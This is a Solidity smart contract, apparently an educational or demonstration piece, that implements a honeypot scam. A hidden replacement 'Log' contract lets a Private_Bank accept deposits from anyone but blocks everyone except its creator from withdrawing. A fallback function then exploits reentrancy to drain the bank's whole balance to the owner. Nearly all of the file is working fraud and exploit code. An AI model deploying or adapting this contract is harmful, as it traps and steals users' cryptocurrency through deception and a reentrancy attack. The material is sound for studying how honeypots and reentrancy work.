pragma solidity ^0.4.19;

import "./Private_Bank.sol";
import "./Mortal.sol";

/// @title MaliciousLog will be used instead of provided "Log" from Private_Bank 
/// @notice This contract is a secret external contract reference, 
/// it creates a "Private_Bank" contract that is a honeypot -
/// Only this contract can withdraw the funds it locks.
contract MaliciousLog is Log, Mortal {
    Private_Bank private target;

    /// @notice Constuctor that intializes this contract and Private_Bank contract.
    /// @dev Requires 1 ether to:  1. Send to Private_Bank (the target) to lure hackers,
    /// 2. Later use to get all funds from the target with reentrancy.
    constructor() public payable {
        require(msg.value == 1 ether);
        owner = msg.sender;
        target = new Private_Bank(address(this));
    }

    /// @notice Initializes the target bank contract with funds to lure hacker.
    function initBankValue() public {
        target.Deposit.value(1 ether)();
    }

    /// @notice A seemingly innocent method that is the core of the hoax.
    /// function calls will: 
    /// - pass when it is for a deposit; 
    /// - fail and revert when a caller tries to "CashOut".
    /// @dev If caller is not "this" contract, it throws and reverts.
    /// Ignore the parameters, they are not relevant.
    function AddMessage(
        address _adr,
        uint256 _val,
        string _data
    ) public {
        // Allow all deposits
        if (!compareStrings(_data, "Deposit")) {
            // only this contract can perform "CashOut" operation
            require(_adr == address(this));
        }
    }
    
    /// @notice Withdraws all the remaining funds from the target contract.
    /// @dev Exploits reentrancy vulnerability to withdraw all funds.
    /// Current contract is the only one that will not be denied in "AddMessage"
    function exploitReentrancy() public {
        target.CashOut(1 ether);
    }

    /// @dev Fallback function that uses reentrancy vulnerability to withdraw all funds.
    function() public payable {
        // Continue until bank contract is empty
        if (address(target).balance >= 1 ether) {
            target.CashOut(1 ether);
        }
    }

    function getPrivateBank() public view returns(Private_Bank privateBank) {
        return target;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public onlyOwner{
        msg.sender.transfer(address(this).balance);
    }

    function compareStrings(string memory a, string memory b)
        private
        pure
        returns (bool)
    {
        return (keccak256(abi.encodePacked((a))) ==
            keccak256(abi.encodePacked((b))));
    }
}
